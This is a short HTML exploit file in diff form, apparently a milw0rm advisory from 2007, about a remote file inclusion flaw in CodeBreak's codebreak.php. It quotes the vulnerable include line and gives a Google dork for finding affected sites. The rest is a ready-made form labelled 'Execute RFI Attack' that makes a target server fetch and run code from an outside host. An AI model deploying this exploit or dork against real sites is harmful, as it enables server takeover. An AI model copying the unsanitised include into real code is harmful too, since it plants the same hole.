@@ -1,0 +1,31 @@
+<!--
+
+CodeBreak (codebreak.php process_method) - Remote File Inclusion Vulnerability
+
+Google d0rk: intitle:"CodeBreak - Hidden Morse Code"
+
+Vulnerable Code: include($_POST["process_method"] . "_" . $_POST["output_method"] . ".inc");
+
+John Martinelli
+john@martinelli.com
+http://john-martinelli.com
+
+April 11th, 2007
+
+!-->
+
+<html>
+<head><title>CodeBreak (codebreak.php process_method) - Remote File Inclusion Vulnerability</title><body>
+
+<center><br><br><font size=4>CodeBreak (codebreak.php process_method) - Remote File Inclusion Vulnerability</font><br><font size=3>discovered by <a href="http://john-martinelli.com">John Martinelli</a><br><br>Google d0rk: <a href="http://www.google.com/search?q=intitle%3A%22CodeBreak+-+Hidden+Morse+Code">intitle:"CodeBreak - Hidden Morse Code"</a></font><br>
+
+<br><br>
+<form action="http://www.target.com/codebreak.php" method="post">
+<input name="input_text" size=75 value="input_text" type=hidden>
+<input name="process_method" size=75 value="http://bad.site/badcode.txt?">
+<input type=submit value="Execute RFI Attack" class="button">
+</form>
+
+</body></html>
+
+# milw0rm.com [2007-04-11]
